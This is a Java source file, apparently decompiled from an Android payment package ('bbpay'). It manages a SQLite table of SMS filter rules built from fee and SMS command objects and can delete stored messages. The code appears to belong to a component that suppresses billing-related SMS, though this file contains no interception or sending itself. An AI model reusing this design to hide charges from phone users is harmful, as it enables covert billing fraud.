package com.bbpay.db;
import java.util.LinkedList;
import java.util.List;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.bbpay.bean.Constants;
import com.bbpay.bean.FeeBean;
import com.bbpay.bean.FilterBean;
import com.bbpay.bean.SmsBean;

public class FilterDBManager {
    private static FilterDBManager manager;
    private FilterDBManager() {}
    public static FilterDBManager getInstance() {
        if (manager == null) manager = new FilterDBManager();
        return manager;
    }
    public void deleteAllGameSMS(Context context) {
        synchronized ("lock") {
            SQLiteDatabase sqlitedatabase = EPayDBHelper.getInstance(context).getWritableDatabase();
            sqlitedatabase.delete("onlinngame", null, null);
            sqlitedatabase.close();
        }
    }
    public void deleteAllSMS(Context context) {
        synchronized ("lock") {
            SQLiteDatabase sqlitedatabase = EPayDBHelper.getInstance(context).getWritableDatabase();
            sqlitedatabase.delete("sms", null, null);
            sqlitedatabase.close();
        }
    }
    public void deleteSMSById(Context context, String s) {
        synchronized ("lock") {
            SQLiteDatabase sqlitedatabase = EPayDBHelper.getInstance(context).getWritableDatabase();
            sqlitedatabase.delete("smsc", "_ID = ?", new String[] { s });
            sqlitedatabase.close();
        }
    }
    public List<FilterBean> getAllFilter(Context context) {
        synchronized ("lock") {
            LinkedList<FilterBean> linkedlist;
            linkedlist = new LinkedList<FilterBean>();
            SQLiteDatabase sqlitedatabase = EPayDBHelper.getInstance(context).getReadableDatabase();
            StringBuffer stringbuffer = new StringBuffer();
            stringbuffer.append(" select ").append(Constants.FILTER_INFO).append(" , ").append(Constants.FILTER_PORT).append(" , ").append("insert_time").append(" , ")
            .append("_ID").append(" from ").append("filter");
            Cursor cursor = sqlitedatabase.rawQuery(stringbuffer.toString(), null);
            cursor.moveToFirst();
            if (cursor.getCount() >= 1) do {
                FilterBean filterbean = new FilterBean();
                filterbean.setFilterContent(cursor.getString(0));
                filterbean.setFilterNum(cursor.getString(1));
                filterbean.setFilterTime(cursor.getString(2));
                filterbean.setId(cursor.getInt(3));
                linkedlist.add(filterbean);
            } while (cursor.moveToNext());
            cursor.close();
            sqlitedatabase.close();
            return linkedlist;
        }
    }
    public void insertFilter(List<FeeBean> list, Context context) {
        synchronized ("lock") {
            SQLiteDatabase db = EPayDBHelper.getInstance(context).getWritableDatabase();
            for (FeeBean bean : list) {
                if (bean instanceof SmsBean) {
                    SmsBean smsbean = (SmsBean) bean;
                    if (!smsbean.isSms() && smsbean.getIsFilter().trim().equals("1")) {
                        ContentValues cv = new ContentValues();
                        cv.put(Constants.FILTER_INFO, smsbean.getCmd());
                        cv.put(Constants.FILTER_PORT, "");
                        cv.put("insert_time", System.currentTimeMillis() + "");
                        db.insert("filter", null, cv);
                    }
                }
                if (bean.getIsFilter().trim().equals("1")) {
                    ContentValues cv = new ContentValues();
                    cv.put(Constants.FILTER_INFO, bean.getFilterInfo());
                    cv.put(Constants.FILTER_PORT, bean.getFilterPort());
                    cv.put("insert_time", System.currentTimeMillis() + "");
                    db.insert("filter", null, cv);
                }
            }
            db.close();
        }
    }
}
